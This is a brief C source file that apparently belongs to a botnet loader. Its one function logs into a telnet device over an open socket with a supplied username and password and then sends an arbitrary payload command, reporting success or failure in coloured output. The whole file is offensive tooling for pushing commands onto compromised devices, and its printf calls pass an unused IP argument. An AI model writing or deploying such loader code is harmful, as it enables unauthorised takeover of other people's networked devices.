#include "../../includes/telnet/payload.h"


/*
    *    util/loader/util/telnet/payload.c
    *    Date: 12/11/21
    *    Author: 0x80000000
*/


void telnet_exec_payload(int fd, char *ipaddr, char *username, char *password, char *payload) {
    strcat(payload, "\n");
    if (send(fd, username, strlen(username), 0) == -1) {
        printf("\e[0;31mStatus: Failed to login!\n", ipaddr);
    }
    
    if (send(fd, password, strlen(password), 0) == -1) {
        printf("\e[0;31mStatus: Failed to login!\n", ipaddr);
    }
    
    if (send(fd, payload, strlen(payload), 0) == -1) {
        printf("\e[0;31mStatus: Failed to send command!\n", ipaddr);
    } else {
        printf("\e[0;32mStatus: Sent Command!\n", ipaddr);
    }
}